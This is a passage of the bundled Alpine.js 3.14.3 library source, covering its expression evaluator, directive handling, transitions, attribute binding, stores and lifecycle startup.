    let AsyncFunction = Object.getPrototypeOf(async function() {}).constructor;
    let rightSideSafeExpression = /^[\n\s]*if.*\(.*\)/.test(expression.trim()) || /^(let|const)\s/.test(expression.trim()) ? `(async()=>{ ${expression} })()` : expression;
    const safeAsyncFunction = ()=>{
        try {
            let func2 = new AsyncFunction([
                "__self",
                "scope"
            ], `with (scope) { __self.result = ${rightSideSafeExpression} }; __self.finished = true; return __self.result;`);
            Object.defineProperty(func2, "name", {
                value: `[Alpine] ${expression}`
            });
            return func2;
        } catch (error2) {
            handleError(error2, el, expression);
            return Promise.resolve();
        }
    };
    let func = safeAsyncFunction();
    evaluatorMemo[expression] = func;
    return func;
}
function generateEvaluatorFromString(dataStack, expression, el) {
    let func = generateFunctionFromString(expression, el);
    return (receiver = ()=>{}, { scope: scope2 = {}, params = [] } = {})=>{
        func.result = void 0;
        func.finished = false;
        let completeScope = mergeProxies([
            scope2,
            ...dataStack
        ]);
        if (typeof func === "function") {
            let promise = func(func, completeScope).catch((error2)=>handleError(error2, el, expression));
            if (func.finished) {
                runIfTypeOfFunction(receiver, func.result, completeScope, params, el);
                func.result = void 0;
            } else promise.then((result)=>{
                runIfTypeOfFunction(receiver, result, completeScope, params, el);
            }).catch((error2)=>handleError(error2, el, expression)).finally(()=>func.result = void 0);
        }
    };
}
function runIfTypeOfFunction(receiver, value, scope2, params, el) {
    if (shouldAutoEvaluateFunctions && typeof value === "function") {
        let result = value.apply(scope2, params);
        if (result instanceof Promise) result.then((i)=>runIfTypeOfFunction(receiver, i, scope2, params)).catch((error2)=>handleError(error2, el, value));
        else receiver(result);
    } else if (typeof value === "object" && value instanceof Promise) value.then((i)=>receiver(i));
    else receiver(value);
}
// packages/alpinejs/src/directives.js
var prefixAsString = "x-";
function prefix(subject = "") {
    return prefixAsString + subject;
}
function setPrefix(newPrefix) {
    prefixAsString = newPrefix;
}
var directiveHandlers = {};
function directive(name, callback) {
    directiveHandlers[name] = callback;
    return {
        before (directive2) {
            if (!directiveHandlers[directive2]) {
                console.warn(String.raw`Cannot find directive \`${directive2}\`. \`${name}\` will use the default order of execution`);
                return;
            }
            const pos = directiveOrder.indexOf(directive2);
            directiveOrder.splice(pos >= 0 ? pos : directiveOrder.indexOf("DEFAULT"), 0, name);
        }
    };
}
function directiveExists(name) {
    return Object.keys(directiveHandlers).includes(name);
}
function directives(el, attributes, originalAttributeOverride) {
    attributes = Array.from(attributes);
    if (el._x_virtualDirectives) {
        let vAttributes = Object.entries(el._x_virtualDirectives).map(([name, value])=>({
                name,
                value
            }));
        let staticAttributes = attributesOnly(vAttributes);
        vAttributes = vAttributes.map((attribute)=>{
            if (staticAttributes.find((attr)=>attr.name === attribute.name)) return {
                name: `x-bind:${attribute.name}`,
                value: `"${attribute.value}"`
            };
            return attribute;
        });
        attributes = attributes.concat(vAttributes);
    }
    let transformedAttributeMap = {};
    let directives2 = attributes.map(toTransformedAttributes((newName, oldName)=>transformedAttributeMap[newName] = oldName)).filter(outNonAlpineAttributes).map(toParsedDirectives(transformedAttributeMap, originalAttributeOverride)).sort(byPriority);
    return directives2.map((directive2)=>{
        return getDirectiveHandler(el, directive2);
    });
}
function attributesOnly(attributes) {
    return Array.from(attributes).map(toTransformedAttributes()).filter((attr)=>!outNonAlpineAttributes(attr));
}
var isDeferringHandlers = false;
var directiveHandlerStacks = /* @__PURE__ */ new Map();
var currentHandlerStackKey = Symbol();
function deferHandlingDirectives(callback) {
    isDeferringHandlers = true;
    let key = Symbol();
    currentHandlerStackKey = key;
    directiveHandlerStacks.set(key, []);
    let flushHandlers = ()=>{
        while(directiveHandlerStacks.get(key).length)directiveHandlerStacks.get(key).shift()();
        directiveHandlerStacks.delete(key);
    };
    let stopDeferring = ()=>{
        isDeferringHandlers = false;
        flushHandlers();
    };
    callback(flushHandlers);
    stopDeferring();
}
function getElementBoundUtilities(el) {
    let cleanups = [];
    let cleanup2 = (callback)=>cleanups.push(callback);
    let [effect3, cleanupEffect] = elementBoundEffect(el);
    cleanups.push(cleanupEffect);
    let utilities = {
        Alpine: alpine_default,
        effect: effect3,
        cleanup: cleanup2,
        evaluateLater: evaluateLater.bind(evaluateLater, el),
        evaluate: evaluate.bind(evaluate, el)
    };
    let doCleanup = ()=>cleanups.forEach((i)=>i());
    return [
        utilities,
        doCleanup
    ];
}
function getDirectiveHandler(el, directive2) {
    let noop = ()=>{};
    let handler4 = directiveHandlers[directive2.type] || noop;
    let [utilities, cleanup2] = getElementBoundUtilities(el);
    onAttributeRemoved(el, directive2.original, cleanup2);
    let fullHandler = ()=>{
        if (el._x_ignore || el._x_ignoreSelf) return;
        handler4.inline && handler4.inline(el, directive2, utilities);
        handler4 = handler4.bind(handler4, el, directive2, utilities);
        isDeferringHandlers ? directiveHandlerStacks.get(currentHandlerStackKey).push(handler4) : handler4();
    };
    fullHandler.runCleanups = cleanup2;
    return fullHandler;
}
var startingWith = (subject, replacement)=>({ name, value })=>{
        if (name.startsWith(subject)) name = name.replace(subject, replacement);
        return {
            name,
            value
        };
    };
var into = (i)=>i;
function toTransformedAttributes(callback = ()=>{}) {
    return ({ name, value })=>{
        let { name: newName, value: newValue } = attributeTransformers.reduce((carry, transform)=>{
            return transform(carry);
        }, {
            name,
            value
        });
        if (newName !== name) callback(newName, name);
        return {
            name: newName,
            value: newValue
        };
    };
}
var attributeTransformers = [];
function mapAttributes(callback) {
    attributeTransformers.push(callback);
}
function outNonAlpineAttributes({ name }) {
    return alpineAttributeRegex().test(name);
}
var alpineAttributeRegex = ()=>new RegExp(`^${prefixAsString}([^:^.]+)\\b`);
function toParsedDirectives(transformedAttributeMap, originalAttributeOverride) {
    return ({ name, value })=>{
        let typeMatch = name.match(alpineAttributeRegex());
        let valueMatch = name.match(/:([a-zA-Z0-9\-_:]+)/);
        let modifiers = name.match(/\.[^.\]]+(?=[^\]]*$)/g) || [];
        let original = originalAttributeOverride || transformedAttributeMap[name] || name;
        return {
            type: typeMatch ? typeMatch[1] : null,
            value: valueMatch ? valueMatch[1] : null,
            modifiers: modifiers.map((i)=>i.replace(".", "")),
            expression: value,
            original
        };
    };
}
var DEFAULT = "DEFAULT";
var directiveOrder = [
    "ignore",
    "ref",
    "data",
    "id",
    "anchor",
    "bind",
    "init",
    "for",
    "model",
    "modelable",
    "transition",
    "show",
    "if",
    DEFAULT,
    "teleport"
];
function byPriority(a, b) {
    let typeA = directiveOrder.indexOf(a.type) === -1 ? DEFAULT : a.type;
    let typeB = directiveOrder.indexOf(b.type) === -1 ? DEFAULT : b.type;
    return directiveOrder.indexOf(typeA) - directiveOrder.indexOf(typeB);
}
// packages/alpinejs/src/utils/dispatch.js
function dispatch(el, name, detail = {}) {
    el.dispatchEvent(new CustomEvent(name, {
        detail,
        bubbles: true,
        // Allows events to pass the shadow DOM barrier.
        composed: true,
        cancelable: true
    }));
}
// packages/alpinejs/src/utils/walk.js
function walk(el, callback) {
    if (typeof ShadowRoot === "function" && el instanceof ShadowRoot) {
        Array.from(el.children).forEach((el2)=>walk(el2, callback));
        return;
    }
    let skip = false;
    callback(el, ()=>skip = true);
    if (skip) return;
    let node = el.firstElementChild;
    while(node){
        walk(node, callback, false);
        node = node.nextElementSibling;
    }
}
// packages/alpinejs/src/utils/warn.js
function warn(message, ...args) {
    console.warn(`Alpine Warning: ${message}`, ...args);
}
// packages/alpinejs/src/lifecycle.js
var started = false;
function start() {
    if (started) warn("Alpine has already been initialized on this page. Calling Alpine.start() more than once can cause problems.");
    started = true;
    if (!document.body) warn("Unable to initialize. Trying to load Alpine before `<body>` is available. Did you forget to add `defer` in Alpine's `<script>` tag?");
    dispatch(document, "alpine:init");
    dispatch(document, "alpine:initializing");
    startObservingMutations();
    onElAdded((el)=>initTree(el, walk));
    onElRemoved((el)=>destroyTree(el));
    onAttributesAdded((el, attrs)=>{
        directives(el, attrs).forEach((handle)=>handle());
    });
    let outNestedComponents = (el)=>!closestRoot(el.parentElement, true);
    Array.from(document.querySelectorAll(allSelectors().join(","))).filter(outNestedComponents).forEach((el)=>{
        initTree(el);
    });
    dispatch(document, "alpine:initialized");
    setTimeout(()=>{
        warnAboutMissingPlugins();
    });
}
var rootSelectorCallbacks = [];
var initSelectorCallbacks = [];
function rootSelectors() {
    return rootSelectorCallbacks.map((fn)=>fn());
}
function allSelectors() {
    return rootSelectorCallbacks.concat(initSelectorCallbacks).map((fn)=>fn());
}
function addRootSelector(selectorCallback) {
    rootSelectorCallbacks.push(selectorCallback);
}
function addInitSelector(selectorCallback) {
    initSelectorCallbacks.push(selectorCallback);
}
function closestRoot(el, includeInitSelectors = false) {
    return findClosest(el, (element)=>{
        const selectors = includeInitSelectors ? allSelectors() : rootSelectors();
        if (selectors.some((selector)=>element.matches(selector))) return true;
    });
}
function findClosest(el, callback) {
    if (!el) return;
    if (callback(el)) return el;
    if (el._x_teleportBack) el = el._x_teleportBack;
    if (!el.parentElement) return;
    return findClosest(el.parentElement, callback);
}
function isRoot(el) {
    return rootSelectors().some((selector)=>el.matches(selector));
}
var initInterceptors2 = [];
function interceptInit(callback) {
    initInterceptors2.push(callback);
}
function initTree(el, walker = walk, intercept = ()=>{}) {
    deferHandlingDirectives(()=>{
        walker(el, (el2, skip)=>{
            intercept(el2, skip);
            initInterceptors2.forEach((i)=>i(el2, skip));
            directives(el2, el2.attributes).forEach((handle)=>handle());
            el2._x_ignore && skip();
        });
    });
}
function destroyTree(root, walker = walk) {
    walker(root, (el)=>{
        cleanupElement(el);
        cleanupAttributes(el);
    });
}
function warnAboutMissingPlugins() {
    let pluginDirectives = [
        [
            "ui",
            "dialog",
            [
                "[x-dialog], [x-popover]"
            ]
        ],
        [
            "anchor",
            "anchor",
            [
                "[x-anchor]"
            ]
        ],
        [
            "sort",
            "sort",
            [
                "[x-sort]"
            ]
        ]
    ];
    pluginDirectives.forEach(([plugin2, directive2, selectors])=>{
        if (directiveExists(directive2)) return;
        selectors.some((selector)=>{
            if (document.querySelector(selector)) {
                warn(`found "${selector}", but missing ${plugin2} plugin`);
                return true;
            }
        });
    });
}
// packages/alpinejs/src/nextTick.js
var tickStack = [];
var isHolding = false;
function nextTick(callback = ()=>{}) {
    queueMicrotask(()=>{
        isHolding || setTimeout(()=>{
            releaseNextTicks();
        });
    });
    return new Promise((res)=>{
        tickStack.push(()=>{
            callback();
            res();
        });
    });
}
function releaseNextTicks() {
    isHolding = false;
    while(tickStack.length)tickStack.shift()();
}
function holdNextTicks() {
    isHolding = true;
}
// packages/alpinejs/src/utils/classes.js
function setClasses(el, value) {
    if (Array.isArray(value)) return setClassesFromString(el, value.join(" "));
    else if (typeof value === "object" && value !== null) return setClassesFromObject(el, value);
    else if (typeof value === "function") return setClasses(el, value());
    return setClassesFromString(el, value);
}
function setClassesFromString(el, classString) {
    let split = (classString2)=>classString2.split(" ").filter(Boolean);
    let missingClasses = (classString2)=>classString2.split(" ").filter((i)=>!el.classList.contains(i)).filter(Boolean);
    let addClassesAndReturnUndo = (classes)=>{
        el.classList.add(...classes);
        return ()=>{
            el.classList.remove(...classes);
        };
    };
    classString = classString === true ? classString = "" : classString || "";
    return addClassesAndReturnUndo(missingClasses(classString));
}
function setClassesFromObject(el, classObject) {
    let split = (classString)=>classString.split(" ").filter(Boolean);
    let forAdd = Object.entries(classObject).flatMap(([classString, bool])=>bool ? split(classString) : false).filter(Boolean);
    let forRemove = Object.entries(classObject).flatMap(([classString, bool])=>!bool ? split(classString) : false).filter(Boolean);
    let added = [];
    let removed = [];
    forRemove.forEach((i)=>{
        if (el.classList.contains(i)) {
            el.classList.remove(i);
            removed.push(i);
        }
    });
    forAdd.forEach((i)=>{
        if (!el.classList.contains(i)) {
            el.classList.add(i);
            added.push(i);
        }
    });
    return ()=>{
        removed.forEach((i)=>el.classList.add(i));
        added.forEach((i)=>el.classList.remove(i));
    };
}
// packages/alpinejs/src/utils/styles.js
function setStyles(el, value) {
    if (typeof value === "object" && value !== null) return setStylesFromObject(el, value);
    return setStylesFromString(el, value);
}
function setStylesFromObject(el, value) {
    let previousStyles = {};
    Object.entries(value).forEach(([key, value2])=>{
        previousStyles[key] = el.style[key];
        if (!key.startsWith("--")) key = kebabCase(key);
        el.style.setProperty(key, value2);
    });
    setTimeout(()=>{
        if (el.style.length === 0) el.removeAttribute("style");
    });
    return ()=>{
        setStyles(el, previousStyles);
    };
}
function setStylesFromString(el, value) {
    let cache = el.getAttribute("style", value);
    el.setAttribute("style", value);
    return ()=>{
        el.setAttribute("style", cache || "");
    };
}
function kebabCase(subject) {
    return subject.replace(/([a-z])([A-Z])/g, "$1-$2").toLowerCase();
}
// packages/alpinejs/src/utils/once.js
function once(callback, fallback = ()=>{}) {
    let called = false;
    return function() {
        if (!called) {
            called = true;
            callback.apply(this, arguments);
        } else fallback.apply(this, arguments);
    };
}
// packages/alpinejs/src/directives/x-transition.js
directive("transition", (el, { value, modifiers, expression }, { evaluate: evaluate2 })=>{
    if (typeof expression === "function") expression = evaluate2(expression);
    if (expression === false) return;
    if (!expression || typeof expression === "boolean") registerTransitionsFromHelper(el, modifiers, value);
    else registerTransitionsFromClassString(el, expression, value);
});
function registerTransitionsFromClassString(el, classString, stage) {
    registerTransitionObject(el, setClasses, "");
    let directiveStorageMap = {
        "enter": (classes)=>{
            el._x_transition.enter.during = classes;
        },
        "enter-start": (classes)=>{
            el._x_transition.enter.start = classes;
        },
        "enter-end": (classes)=>{
            el._x_transition.enter.end = classes;
        },
        "leave": (classes)=>{
            el._x_transition.leave.during = classes;
        },
        "leave-start": (classes)=>{
            el._x_transition.leave.start = classes;
        },
        "leave-end": (classes)=>{
            el._x_transition.leave.end = classes;
        }
    };
    directiveStorageMap[stage](classString);
}
function registerTransitionsFromHelper(el, modifiers, stage) {
    registerTransitionObject(el, setStyles);
    let doesntSpecify = !modifiers.includes("in") && !modifiers.includes("out") && !stage;
    let transitioningIn = doesntSpecify || modifiers.includes("in") || [
        "enter"
    ].includes(stage);
    let transitioningOut = doesntSpecify || modifiers.includes("out") || [
        "leave"
    ].includes(stage);
    if (modifiers.includes("in") && !doesntSpecify) modifiers = modifiers.filter((i, index)=>index < modifiers.indexOf("out"));
    if (modifiers.includes("out") && !doesntSpecify) modifiers = modifiers.filter((i, index)=>index > modifiers.indexOf("out"));
    let wantsAll = !modifiers.includes("opacity") && !modifiers.includes("scale");
    let wantsOpacity = wantsAll || modifiers.includes("opacity");
    let wantsScale = wantsAll || modifiers.includes("scale");
    let opacityValue = wantsOpacity ? 0 : 1;
    let scaleValue = wantsScale ? modifierValue(modifiers, "scale", 95) / 100 : 1;
    let delay = modifierValue(modifiers, "delay", 0) / 1e3;
    let origin = modifierValue(modifiers, "origin", "center");
    let property = "opacity, transform";
    let durationIn = modifierValue(modifiers, "duration", 150) / 1e3;
    let durationOut = modifierValue(modifiers, "duration", 75) / 1e3;
    let easing = `cubic-bezier(0.4, 0.0, 0.2, 1)`;
    if (transitioningIn) {
        el._x_transition.enter.during = {
            transformOrigin: origin,
            transitionDelay: `${delay}s`,
            transitionProperty: property,
            transitionDuration: `${durationIn}s`,
            transitionTimingFunction: easing
        };
        el._x_transition.enter.start = {
            opacity: opacityValue,
            transform: `scale(${scaleValue})`
        };
        el._x_transition.enter.end = {
            opacity: 1,
            transform: `scale(1)`
        };
    }
    if (transitioningOut) {
        el._x_transition.leave.during = {
            transformOrigin: origin,
            transitionDelay: `${delay}s`,
            transitionProperty: property,
            transitionDuration: `${durationOut}s`,
            transitionTimingFunction: easing
        };
        el._x_transition.leave.start = {
            opacity: 1,
            transform: `scale(1)`
        };
        el._x_transition.leave.end = {
            opacity: opacityValue,
            transform: `scale(${scaleValue})`
        };
    }
}
function registerTransitionObject(el, setFunction, defaultValue = {}) {
    if (!el._x_transition) el._x_transition = {
        enter: {
            during: defaultValue,
            start: defaultValue,
            end: defaultValue
        },
        leave: {
            during: defaultValue,
            start: defaultValue,
            end: defaultValue
        },
        in (before = ()=>{}, after = ()=>{}) {
            transition(el, setFunction, {
                during: this.enter.during,
                start: this.enter.start,
                end: this.enter.end
            }, before, after);
        },
        out (before = ()=>{}, after = ()=>{}) {
            transition(el, setFunction, {
                during: this.leave.during,
                start: this.leave.start,
                end: this.leave.end
            }, before, after);
        }
    };
}
window.Element.prototype._x_toggleAndCascadeWithTransitions = function(el, value, show, hide) {
    const nextTick2 = document.visibilityState === "visible" ? requestAnimationFrame : setTimeout;
    let clickAwayCompatibleShow = ()=>nextTick2(show);
    if (value) {
        if (el._x_transition && (el._x_transition.enter || el._x_transition.leave)) el._x_transition.enter && (Object.entries(el._x_transition.enter.during).length || Object.entries(el._x_transition.enter.start).length || Object.entries(el._x_transition.enter.end).length) ? el._x_transition.in(show) : clickAwayCompatibleShow();
        else el._x_transition ? el._x_transition.in(show) : clickAwayCompatibleShow();
        return;
    }
    el._x_hidePromise = el._x_transition ? new Promise((resolve, reject)=>{
        el._x_transition.out(()=>{}, ()=>resolve(hide));
        el._x_transitioning && el._x_transitioning.beforeCancel(()=>reject({
                isFromCancelledTransition: true
            }));
    }) : Promise.resolve(hide);
    queueMicrotask(()=>{
        let closest = closestHide(el);
        if (closest) {
            if (!closest._x_hideChildren) closest._x_hideChildren = [];
            closest._x_hideChildren.push(el);
        } else nextTick2(()=>{
            let hideAfterChildren = (el2)=>{
                let carry = Promise.all([
                    el2._x_hidePromise,
                    ...(el2._x_hideChildren || []).map(hideAfterChildren)
                ]).then(([i])=>i?.());
                delete el2._x_hidePromise;
                delete el2._x_hideChildren;
                return carry;
            };
            hideAfterChildren(el).catch((e)=>{
                if (!e.isFromCancelledTransition) throw e;
            });
        });
    });
};
function closestHide(el) {
    let parent = el.parentNode;
    if (!parent) return;
    return parent._x_hidePromise ? parent : closestHide(parent);
}
function transition(el, setFunction, { during, start: start2, end } = {}, before = ()=>{}, after = ()=>{}) {
    if (el._x_transitioning) el._x_transitioning.cancel();
    if (Object.keys(during).length === 0 && Object.keys(start2).length === 0 && Object.keys(end).length === 0) {
        before();
        after();
        return;
    }
    let undoStart, undoDuring, undoEnd;
    performTransition(el, {
        start () {
            undoStart = setFunction(el, start2);
        },
        during () {
            undoDuring = setFunction(el, during);
        },
        before,
        end () {
            undoStart();
            undoEnd = setFunction(el, end);
        },
        after,
        cleanup () {
            undoDuring();
            undoEnd();
        }
    });
}
function performTransition(el, stages) {
    let interrupted, reachedBefore, reachedEnd;
    let finish = once(()=>{
        mutateDom(()=>{
            interrupted = true;
            if (!reachedBefore) stages.before();
            if (!reachedEnd) {
                stages.end();
                releaseNextTicks();
            }
            stages.after();
            if (el.isConnected) stages.cleanup();
            delete el._x_transitioning;
        });
    });
    el._x_transitioning = {
        beforeCancels: [],
        beforeCancel (callback) {
            this.beforeCancels.push(callback);
        },
        cancel: once(function() {
            while(this.beforeCancels.length)this.beforeCancels.shift()();
            finish();
        }),
        finish
    };
    mutateDom(()=>{
        stages.start();
        stages.during();
    });
    holdNextTicks();
    requestAnimationFrame(()=>{
        if (interrupted) return;
        let duration = Number(getComputedStyle(el).transitionDuration.replace(/,.*/, "").replace("s", "")) * 1e3;
        let delay = Number(getComputedStyle(el).transitionDelay.replace(/,.*/, "").replace("s", "")) * 1e3;
        if (duration === 0) duration = Number(getComputedStyle(el).animationDuration.replace("s", "")) * 1e3;
        mutateDom(()=>{
            stages.before();
        });
        reachedBefore = true;
        requestAnimationFrame(()=>{
            if (interrupted) return;
            mutateDom(()=>{
                stages.end();
            });
            releaseNextTicks();
            setTimeout(el._x_transitioning.finish, duration + delay);
            reachedEnd = true;
        });
    });
}
function modifierValue(modifiers, key, fallback) {
    if (modifiers.indexOf(key) === -1) return fallback;
    const rawValue = modifiers[modifiers.indexOf(key) + 1];
    if (!rawValue) return fallback;
    if (key === "scale") {
        if (isNaN(rawValue)) return fallback;
    }
    if (key === "duration" || key === "delay") {
        let match = rawValue.match(/([0-9]+)ms/);
        if (match) return match[1];
    }
    if (key === "origin") {
        if ([
            "top",
            "right",
            "left",
            "center",
            "bottom"
        ].includes(modifiers[modifiers.indexOf(key) + 2])) return [
            rawValue,
            modifiers[modifiers.indexOf(key) + 2]
        ].join(" ");
    }
    return rawValue;
}
// packages/alpinejs/src/clone.js
var isCloning = false;
function skipDuringClone(callback, fallback = ()=>{}) {
    return (...args)=>isCloning ? fallback(...args) : callback(...args);
}
function onlyDuringClone(callback) {
    return (...args)=>isCloning && callback(...args);
}
var interceptors = [];
function interceptClone(callback) {
    interceptors.push(callback);
}
function cloneNode(from, to) {
    interceptors.forEach((i)=>i(from, to));
    isCloning = true;
    dontRegisterReactiveSideEffects(()=>{
        initTree(to, (el, callback)=>{
            callback(el, ()=>{});
        });
    });
    isCloning = false;
}
var isCloningLegacy = false;
function clone(oldEl, newEl) {
    if (!newEl._x_dataStack) newEl._x_dataStack = oldEl._x_dataStack;
    isCloning = true;
    isCloningLegacy = true;
    dontRegisterReactiveSideEffects(()=>{
        cloneTree(newEl);
    });
    isCloning = false;
    isCloningLegacy = false;
}
function cloneTree(el) {
    let hasRunThroughFirstEl = false;
    let shallowWalker = (el2, callback)=>{
        walk(el2, (el3, skip)=>{
            if (hasRunThroughFirstEl && isRoot(el3)) return skip();
            hasRunThroughFirstEl = true;
            callback(el3, skip);
        });
    };
    initTree(el, shallowWalker);
}
function dontRegisterReactiveSideEffects(callback) {
    let cache = effect;
    overrideEffect((callback2, el)=>{
        let storedEffect = cache(callback2);
        release(storedEffect);
        return ()=>{};
    });
    callback();
    overrideEffect(cache);
}
// packages/alpinejs/src/utils/bind.js
function bind(el, name, value, modifiers = []) {
    if (!el._x_bindings) el._x_bindings = reactive({});
    el._x_bindings[name] = value;
    name = modifiers.includes("camel") ? camelCase(name) : name;
    switch(name){
        case "value":
            bindInputValue(el, value);
            break;
        case "style":
            bindStyles(el, value);
            break;
        case "class":
            bindClasses(el, value);
            break;
        case "selected":
        case "checked":
            bindAttributeAndProperty(el, name, value);
            break;
        default:
            bindAttribute(el, name, value);
            break;
    }
}
function bindInputValue(el, value) {
    if (isRadio(el)) {
        if (el.attributes.value === void 0) el.value = value;
        if (window.fromModel) {
            if (typeof value === "boolean") el.checked = safeParseBoolean(el.value) === value;
            else el.checked = checkedAttrLooseCompare(el.value, value);
        }
    } else if (isCheckbox(el)) {
        if (Number.isInteger(value)) el.value = value;
        else if (!Array.isArray(value) && typeof value !== "boolean" && ![
            null,
            void 0
        ].includes(value)) el.value = String(value);
        else if (Array.isArray(value)) el.checked = value.some((val)=>checkedAttrLooseCompare(val, el.value));
        else el.checked = !!value;
    } else if (el.tagName === "SELECT") updateSelect(el, value);
    else {
        if (el.value === value) return;
        el.value = value === void 0 ? "" : value;
    }
}
function bindClasses(el, value) {
    if (el._x_undoAddedClasses) el._x_undoAddedClasses();
    el._x_undoAddedClasses = setClasses(el, value);
}
function bindStyles(el, value) {
    if (el._x_undoAddedStyles) el._x_undoAddedStyles();
    el._x_undoAddedStyles = setStyles(el, value);
}
function bindAttributeAndProperty(el, name, value) {
    bindAttribute(el, name, value);
    setPropertyIfChanged(el, name, value);
}
function bindAttribute(el, name, value) {
    if ([
        null,
        void 0,
        false
    ].includes(value) && attributeShouldntBePreservedIfFalsy(name)) el.removeAttribute(name);
    else {
        if (isBooleanAttr(name)) value = name;
        setIfChanged(el, name, value);
    }
}
function setIfChanged(el, attrName, value) {
    if (el.getAttribute(attrName) != value) el.setAttribute(attrName, value);
}
function setPropertyIfChanged(el, propName, value) {
    if (el[propName] !== value) el[propName] = value;
}
function updateSelect(el, value) {
    const arrayWrappedValue = [].concat(value).map((value2)=>{
        return value2 + "";
    });
    Array.from(el.options).forEach((option)=>{
        option.selected = arrayWrappedValue.includes(option.value);
    });
}
function camelCase(subject) {
    return subject.toLowerCase().replace(/-(\w)/g, (match, char)=>char.toUpperCase());
}
function checkedAttrLooseCompare(valueA, valueB) {
    return valueA == valueB;
}
function safeParseBoolean(rawValue) {
    if ([
        1,
        "1",
        "true",
        "on",
        "yes",
        true
    ].includes(rawValue)) return true;
    if ([
        0,
        "0",
        "false",
        "off",
        "no",
        false
    ].includes(rawValue)) return false;
    return rawValue ? Boolean(rawValue) : null;
}
var booleanAttributes = /* @__PURE__ */ new Set([
    "allowfullscreen",
    "async",
    "autofocus",
    "autoplay",
    "checked",
    "controls",
    "default",
    "defer",
    "disabled",
    "formnovalidate",
    "inert",
    "ismap",
    "itemscope",
    "loop",
    "multiple",
    "muted",
    "nomodule",
    "novalidate",
    "open",
    "playsinline",
    "readonly",
    "required",
    "reversed",
    "selected",
    "shadowrootclonable",
    "shadowrootdelegatesfocus",
    "shadowrootserializable"
]);
function isBooleanAttr(attrName) {
    return booleanAttributes.has(attrName);
}
function attributeShouldntBePreservedIfFalsy(name) {
    return ![
        "aria-pressed",
        "aria-checked",
        "aria-expanded",
        "aria-selected"
    ].includes(name);
}
function getBinding(el, name, fallback) {
    if (el._x_bindings && el._x_bindings[name] !== void 0) return el._x_bindings[name];
    return getAttributeBinding(el, name, fallback);
}
function extractProp(el, name, fallback, extract = true) {
    if (el._x_bindings && el._x_bindings[name] !== void 0) return el._x_bindings[name];
    if (el._x_inlineBindings && el._x_inlineBindings[name] !== void 0) {
        let binding = el._x_inlineBindings[name];
        binding.extract = extract;
        return dontAutoEvaluateFunctions(()=>{
            return evaluate(el, binding.expression);
        });
    }
    return getAttributeBinding(el, name, fallback);
}
function getAttributeBinding(el, name, fallback) {
    let attr = el.getAttribute(name);
    if (attr === null) return typeof fallback === "function" ? fallback() : fallback;
    if (attr === "") return true;
    if (isBooleanAttr(name)) return !![
        name,
        "true"
    ].includes(attr);
    return attr;
}
function isCheckbox(el) {
    return el.type === "checkbox" || el.localName === "ui-checkbox" || el.localName === "ui-switch";
}
function isRadio(el) {
    return el.type === "radio" || el.localName === "ui-radio";
}
// packages/alpinejs/src/utils/debounce.js
function debounce(func, wait) {
    var timeout;
    return function() {
        var context = this, args = arguments;
        var later = function() {
            timeout = null;
            func.apply(context, args);
        };
        clearTimeout(timeout);
        timeout = setTimeout(later, wait);
    };
}
// packages/alpinejs/src/utils/throttle.js
function throttle(func, limit) {
    let inThrottle;
    return function() {
        let context = this, args = arguments;
        if (!inThrottle) {
            func.apply(context, args);
            inThrottle = true;
            setTimeout(()=>inThrottle = false, limit);
        }
    };
}
// packages/alpinejs/src/entangle.js
function entangle({ get: outerGet, set: outerSet }, { get: innerGet, set: innerSet }) {
    let firstRun = true;
    let outerHash;
    let innerHash;
    let reference = effect(()=>{
        let outer = outerGet();
        let inner = innerGet();
        if (firstRun) {
            innerSet(cloneIfObject(outer));
            firstRun = false;
        } else {
            let outerHashLatest = JSON.stringify(outer);
            let innerHashLatest = JSON.stringify(inner);
            if (outerHashLatest !== outerHash) innerSet(cloneIfObject(outer));
            else if (outerHashLatest !== innerHashLatest) outerSet(cloneIfObject(inner));
        }
        outerHash = JSON.stringify(outerGet());
        innerHash = JSON.stringify(innerGet());
    });
    return ()=>{
        release(reference);
    };
}
function cloneIfObject(value) {
    return typeof value === "object" ? JSON.parse(JSON.stringify(value)) : value;
}
// packages/alpinejs/src/plugin.js
function plugin(callback) {
    let callbacks = Array.isArray(callback) ? callback : [
        callback
    ];
    callbacks.forEach((i)=>i(alpine_default));
}
// packages/alpinejs/src/store.js
var stores = {};
var isReactive = false;
function store(name, value) {
    if (!isReactive) {
        stores = reactive(stores);
        isReactive = true;
    }
    if (value === void 0) return stores[name];
    stores[name] = value;
    initInterceptors(stores[name]);
    if (typeof value === "object" && value !== null && value.hasOwnProperty("init") && typeof value.init === "function") stores[name].init();
}
function getStores() {
    return stores;
}
// packages/alpinejs/src/binds.js
var binds = {};
function bind2(name, bindings) {
    let getBindings = typeof bindings !== "function" ? ()=>bindings : bindings;
    if (name instanceof Element) return applyBindingsObject(name, getBindings());
    else binds[name] = getBindings;
    return ()=>{};
}
function injectBindingProviders(obj) {
    Object.entries(binds).forEach(([name, callback])=>{
        Object.defineProperty(obj, name, {
            get () {
                return (...args)=>{
                    return callback(...args);
                };
            }
        });
    });
    return obj;
}
function applyBindingsObject(el, obj, original) {
    let cleanupRunners = [];
    while(cleanupRunners.length)cleanupRunners.pop()();
    let attributes = Object.entries(obj).map(([name, value])=>({
            name,
            value
        }));
    let staticAttributes = attributesOnly(attributes);
    attributes = attributes.map((attribute)=>{
        if (staticAttributes.find((attr)=>attr.name === attribute.name)) return {
            name: `x-bind:${attribute.name}`,
            value: `"${attribute.value}"`
        };
        return attribute;
    });
    directives(el, attributes, original).map((handle)=>{
        cleanupRunners.push(handle.runCleanups);
        handle();
    });
    return ()=>{
        while(cleanupRunners.length)cleanupRunners.pop()();
    };
}
// packages/alpinejs/src/datas.js
var datas = {};
function data(name, callback) {
    datas[name] = callback;
}
function injectDataProviders(obj, context) {
    Object.entries(datas).forEach(([name, callback])=>{
        Object.defineProperty(obj, name, {
            get () {
                return (...args)=>{
                    return callback.bind(context)(...args);
                };
            },
            enumerable: false
        });
    });
    return obj;
}
// packages/alpinejs/src/alpine.js
var Alpine = {
    get reactive () {
        return reactive;
    },
    get release () {
        return release;
    },
    get effect () {
        return effect;
    },
    get raw () {
        return raw;
    },
    version: "3.14.3",
    flushAndStopDeferringMutations,
    dontAutoEvaluateFunctions,
    disableEffectScheduling,
    startObservingMutations,
    stopObservingMutations,
    setReactivityEngine,
    onAttributeRemoved,
    onAttributesAdded,
    closestDataStack,
    skipDuringClone,
    onlyDuringClone,
    addRootSelector,
    addInitSelector,
    interceptClone,
    addScopeToNode,
    deferMutations,
    mapAttributes,
    evaluateLater,
    interceptInit,
    setEvaluator,
    mergeProxies,
    extractProp,
    findClosest,
    onElRemoved,
    closestRoot,
    destroyTree,
    interceptor,
    // INTERNAL: not public API and is subject to change without major release.
    transition,
